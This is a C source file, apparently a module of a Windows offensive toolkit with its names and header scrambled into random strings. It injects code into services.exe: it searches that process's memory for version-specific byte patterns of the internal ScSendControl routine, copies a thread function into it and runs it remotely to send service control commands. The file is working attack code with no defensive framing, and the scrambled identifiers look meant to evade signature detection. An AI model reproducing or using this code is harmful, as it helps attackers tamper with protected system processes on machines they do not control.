/*	4oM5AQx1 w4Er5 `09o6X7tzWM`
	https://blog.09o6X7tzWM.com
	dqTBkqdWaZiU5U2aN6CKrRY
	Licence : https://awr13GOqyUBjG1k.org/licenses/by/4.0/
*/
#include "kcpdclqlservice_remote.h"
#if defined(SERVICE_INCONTROL)

PVOID pScSendControl = NULL;

#if defined(_M_X64)
BYTE PTRN_WN61_ScSendControl[]		= {0x48, 0x81, 0xec, 0xe0, 0x00, 0x00, 0x00, 0x33, 0xdb, 0x33, 0xc0};
BYTE PTRN_WIN8_ScSendControl[]		= {0x48, 0x8d, 0x6c, 0x24, 0xf9, 0x48, 0x81, 0xec, 0xd0, 0x00, 0x00, 0x00, 0x33, 0xdb, 0x33, 0xc0};
BYTE PTRN_WI10_ScSendControl[]		= {0x48, 0x8d, 0x6c, 0x24, 0xf9, 0x48, 0x81, 0xec, 0xe0, 0x00, 0x00, 0x00, 0x33, 0xf6};
KULL_M_PATCH_GENERIC ScSendControlReferences[] = {
	{KULL_M_WIN_BUILD_7,		{sizeof(PTRN_WN61_ScSendControl),	PTRN_WN61_ScSendControl},	{0, NULL}, {-26}},
	{KULL_M_WIN_BUILD_8,		{sizeof(PTRN_WIN8_ScSendControl),	PTRN_WIN8_ScSendControl},	{0, NULL}, {-21}},
	{KULL_M_WIN_BUILD_10_1507,		{sizeof(PTRN_WI10_ScSendControl),	PTRN_WI10_ScSendControl},	{0, NULL}, {-21}},
};
#elif defined(_M_IX86)
BYTE PTRN_WN61_ScSendControl[]		= {0x8b, 0xff, 0x55, 0x8b, 0xec, 0x81, 0xec, 0x94, 0x00, 0x00, 0x00, 0x53};
BYTE PTRN_WIN8_ScSendControl[]		= {0x8b, 0xff, 0x55, 0x8b, 0xec, 0x83, 0xe4, 0xf8, 0x83, 0xec, 0x7c};
BYTE PTRN_WI10_ScSendControl[]		= {0x8b, 0xff, 0x55, 0x8b, 0xec, 0x83, 0xe4, 0xf8, 0x83, 0xec, 0x7c, 0x53, 0x56, 0x57, 0x89};

KULL_M_PATCH_GENERIC ScSendControlReferences[] = {
	{KULL_M_WIN_BUILD_7,		{sizeof(PTRN_WN61_ScSendControl),	PTRN_WN61_ScSendControl},	{0, NULL}, {0}},
	{KULL_M_WIN_BUILD_8,		{sizeof(PTRN_WIN8_ScSendControl),	PTRN_WIN8_ScSendControl},	{0, NULL}, {0}},
	{KULL_M_WIN_BUILD_10_1507,		{sizeof(PTRN_WI10_ScSendControl),	PTRN_WI10_ScSendControl},	{0, NULL}, {0}},
};
#endif

#pragma optimize("", off)
DWORD WINAPI kcpd_service_sendcontrol_std_thread(PREMOTE_LIB_DATA lpParameter)
{
	lpParameter->output.outputStatus = ((PSCSENDCONTROL_STD) lpParameter->input.inputVoid)((LPCWSTR) lpParameter->input.inputData, 0, 0, 0, lpParameter->input.inputDword, 0, 0, 0, 0, 0, 0, 0, 0, 0);
	return STATUS_SUCCESS;
}
DWORD kcpd_service_sendcontrol_std_thread_end(){return 'svcs';}

DWORD WINAPI kcpd_service_sendcontrol_fast_thread(PREMOTE_LIB_DATA lpParameter)
{
	lpParameter->output.outputStatus = ((PSCSENDCONTROL_FAST) lpParameter->input.inputVoid)((LPCWSTR) lpParameter->input.inputData, 0, 0, 0, lpParameter->input.inputDword, 0, 0, 0, 0, 0, 0, 0, 0, 0);
	return STATUS_SUCCESS;
}
DWORD kcpd_service_sendcontrol_fast_thread_end(){return 'svcf';}
#pragma optimize("", on)

BOOL kcpd_service_sendcontrol_inprocess(PWSTR ServiceName, DWORD dwControl)
{
	BOOL status = FALSE;
	DWORD processId, szCode;
	PVOID pCode;
	HANDLE hProcess;
	KULL_M_MEMORY_ADDRESS aRemoteFunc;
	KULL_M_MEMORY_ADDRESS aLocalMemory = {NULL, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE};
	KULL_M_MEMORY_SEARCH sMemory;
	PKULL_M_PATCH_GENERIC currentReference;
	PEB Peb;
	PIMAGE_NT_HEADERS pNtHeaders;
	PREMOTE_LIB_INPUT_DATA iData;
	REMOTE_LIB_OUTPUT_DATA oData;

	if(ydeuclqlprocess_getProcessIdForName(L"services.exe", &processId))
	{
		if(hProcess = OpenProcess(PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_QUERY_INFORMATION | PROCESS_CREATE_THREAD, FALSE, processId))
		{
			if(ydeuclqlmemory_open(KULL_M_MEMORY_TYPE_PROCESS, hProcess, &sMemory.ydeuclqlmemoryRange.ydeuclqlmemoryAdress.hMemory))
			{
				if(!pScSendControl)
				{
					if(ydeuclqlprocess_peb(sMemory.ydeuclqlmemoryRange.ydeuclqlmemoryAdress.hMemory, &Peb, FALSE))
					{
						sMemory.ydeuclqlmemoryRange.ydeuclqlmemoryAdress.address = Peb.ImageBaseAddress;
						if(ydeuclqlprocess_ntheaders(&sMemory.ydeuclqlmemoryRange.ydeuclqlmemoryAdress, &pNtHeaders))
						{
							sMemory.ydeuclqlmemoryRange.ydeuclqlmemoryAdress.address = (LPVOID) pNtHeaders->OptionalHeader.ImageBase;
							sMemory.ydeuclqlmemoryRange.size = pNtHeaders->OptionalHeader.SizeOfImage;
							if(currentReference = ydeuclqlpatch_getGenericFromBuild(ScSendControlReferences, ARRAYSIZE(ScSendControlReferences), AHFIEEIO_NT_BUILD_NUMBER))
							{
								aLocalMemory.address = currentReference->Search.Pattern;
								if(ydeuclqlmemory_search(&aLocalMemory, currentReference->Search.Length, &sMemory, FALSE))
									pScSendControl = (PBYTE) sMemory.result + currentReference->Offsets.off0;
								else PRINT_ERROR_AUTO(L"ydeuclqlmemory_search");
							}
							LocalFree(pNtHeaders);
						}
					}
				}

				if(pScSendControl)
				{
					if(AHFIEEIO_NT_BUILD_NUMBER < KULL_M_WIN_BUILD_8)
					{
						szCode = (DWORD) ((PBYTE) kcpd_service_sendcontrol_std_thread_end - (PBYTE) kcpd_service_sendcontrol_std_thread);
						pCode = kcpd_service_sendcontrol_std_thread;
					}
					else
					{
						szCode = (DWORD) ((PBYTE) kcpd_service_sendcontrol_fast_thread_end - (PBYTE) kcpd_service_sendcontrol_fast_thread);
						pCode = kcpd_service_sendcontrol_fast_thread;
					}
					
					if(ydeuclqlremotelib_CreateRemoteCodeWitthPatternReplace(sMemory.ydeuclqlmemoryRange.ydeuclqlmemoryAdress.hMemory, pCode, szCode, NULL, &aRemoteFunc))
					{
						if(iData = ydeuclqlremotelib_CreateInput(pScSendControl, dwControl, (DWORD) (wcslen(ServiceName) + 1) * sizeof(wchar_t), ServiceName))
						{
							if(ydeuclqlremotelib_create(&aRemoteFunc, iData, &oData))
							{
								if(oData.outputStatus)
									kprintf(L"error %u\n", oData.outputStatus);
								else
									kprintf(L"OK!\n");
							}
							else PRINT_ERROR_AUTO(L"ydeuclqlremotelib_create");
							LocalFree(iData);
						}
						ydeuclqlmemory_free(&aRemoteFunc, 0);
					}
					else PRINT_ERROR(L"ydeuclqlremotelib_CreateRemoteCodeWitthPatternReplace\n");
				}
				else PRINT_ERROR(L"Not available without ScSendControl\n");
				ydeuclqlmemory_close(sMemory.ydeuclqlmemoryRange.ydeuclqlmemoryAdress.hMemory);
			}
			CloseHandle(hProcess);
		}
		else PRINT_ERROR_AUTO(L"OpenProcess");
	}
	return status;
}
#endif